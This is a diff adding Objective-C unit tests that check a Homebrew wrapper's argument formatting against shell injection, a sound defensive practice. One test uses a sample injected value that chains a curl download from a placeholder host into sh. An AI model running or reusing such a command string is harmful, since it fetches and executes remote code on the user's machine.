@@ -15,6 +15,7 @@
 // Exposes the private output-block helper for the nil-safety regression tests.
 @interface BPHomebrewInterface (Testing)
 - (void)invokeOutputBlock:(void (^)(NSString *))block withString:(NSString *)string;
+- (NSArray *)formatArguments:(NSArray *)extraArguments sendOutputId:(BOOL)sendOutputID;
 @end
 
 @interface BPHomebrewInterfaceListCall : NSObject
@@ -297,6 +298,47 @@
 	} withString:@"hello"];
 
 	XCTAssertEqualObjects(received, @"hello", @"a non-nil block still receives the output");
+}
+
+#pragma mark - formatArguments: (shell-injection safety)
+
+- (void)testFormatArgumentsPassesArgsAsPositionalParameters
+{
+	// -l -c '<script>' <$0> <$1> ... — args live in argv, not the command string.
+	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"tap", @"user/repo" ] sendOutputId:NO];
+
+	XCTAssertEqualObjects(argv[0], @"-l");
+	XCTAssertEqualObjects(argv[1], @"-c");
+	XCTAssertEqualObjects(argv[2], @"brew \"$@\"", @"the command references $@, not interpolated args");
+	XCTAssertEqualObjects(argv[3], @"brew", @"$0 is a label");
+	XCTAssertEqualObjects(argv[4], @"tap");
+	XCTAssertEqualObjects(argv[5], @"user/repo");
+}
+
+- (void)testFormatArgumentsKeepsShellMetacharactersInert
+{
+	NSString *malicious = @"foo; curl evil.sh | sh";
+	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"tap", malicious ] sendOutputId:NO];
+
+	// The injected payload must never reach the shell command string...
+	XCTAssertFalse([argv[2] containsString:@"curl"], @"user input must not reach the command string");
+	// ...and must survive as a single, unsplit argument.
+	XCTAssertTrue([argv containsObject:malicious], @"the malicious string stays one argument");
+}
+
+- (void)testFormatArgumentsWithOutputIdKeepsMarkerAndPositionalArgs
+{
+	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"list" ] sendOutputId:YES];
+
+	XCTAssertTrue([argv[2] hasPrefix:@"echo "], @"the output marker is still emitted");
+	XCTAssertTrue([argv[2] hasSuffix:@"brew \"$@\""]);
+	XCTAssertEqualObjects(argv.lastObject, @"list");
+}
+
+- (void)testFormatArgumentsHandlesEmptyArguments
+{
+	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[] sendOutputId:NO];
+	XCTAssertEqualObjects(argv, (@[ @"-l", @"-c", @"brew \"$@\"", @"brew" ]));
 }
 
 @end
